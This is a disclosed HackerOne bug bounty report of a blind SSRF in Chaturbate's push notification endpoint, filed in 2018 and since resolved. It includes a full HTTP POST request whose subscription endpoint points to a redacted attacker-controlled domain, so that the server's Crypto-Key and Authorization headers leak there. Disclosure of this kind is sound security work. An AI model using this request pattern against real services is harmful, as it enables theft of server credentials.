---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/server-side-request-forgery-ssrf
  - env/web
substate: "resolved"
weakness: "Server-Side Request Forgery (SSRF)"
enriched: true
body: true
date: 2018-10-21
submitted: 2018-09-20T17:04:29.167Z
bounty_usd: null
votes: 54
cve: []
program: "[[programs/chaturbate|Chaturbate]]"
reporter: "robin0oklay"
source: "https://hackerone.com/reports/411865"
title: "Blind SSRF at https://chaturbate.com/notifications/update_push/"
---
# Blind SSRF at https://chaturbate.com/notifications/update_push/

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 54 | **Program:** Chaturbate | **Disclosed:** 2018-10-21

- Report: [https://hackerone.com/reports/411865](https://hackerone.com/reports/411865)
- CWE: Server-Side Request Forgery (SSRF)
- Submitted: 2018-09-20T17:04:29.167Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

In the application at https://chaturbate.com/notifications/update_push/ there is a functionality to subscribe any cam model which will trigger the provided request. Using this Request an attacker can execute SSRF attack and also steal sensitive Token / Keys of the internal web server

Steps to Replicate the submission:-

Login to your https://chaturbate.com/ account or use my account-
USERNAME-██████████
PASSWORD-███████

Now click on profile, or trigger any request so that you can get your Cookie / CSRF token.

Send any request to repeater and replace it with the provided request

POST /notifications/update_push/ HTTP/1.1
Host: chaturbate.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: https://chaturbate.com/princesscin/
Content-Type: application/x-www-form-urlencoded
X-CSRFToken: YOURCSRFHERE
X-Requested-With: XMLHttpRequest
Content-Length: 408
Cookie: YOURCOOKIEHERE
Connection: close

subscription={"endpoint":"http:\/\/███\/wpush\/v2\/████&unsub=false

As you can see that I have changed the actual URL to my domain ████████, so that I can get the actual request send to the server.

Put your cookie and CSRF token (you can copy CSRF token from your cookies) over here and than send this request

Go to this URL to confirm SSRF at - http://████████████
you will find that your Crypto-Key, Encryption header and Authorization Header is getting leaked onto the Attackers malicious site.
These headers are very sensitive to be leaked and hence needs to be fixed as soon as possible.

##Note
The application do not require to send the URL along with the domain, it is secure to only send the Rest part of the URL and do not include the domain so that the attacker could not control the complete request.

Thanks

Regards
Robin Ooklay

## Impact

Using this Request an attacker can execute SSRF attack and also steal sensitive Token / Keys of the internal web server.

## Timeline

- **Report Filed**
- **Report Severity Updated**
- **Report Title Updated**
- **Report Triaged**
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **2018-09-21** @robin0oklay: Hey can you also please hide "http:\/\/████" from the request body and also http://██████████████ the confirmation link.
- **2018-09-21** @williammmllc: @robin0oklay no problem, this is done.
- **Report Became Public**
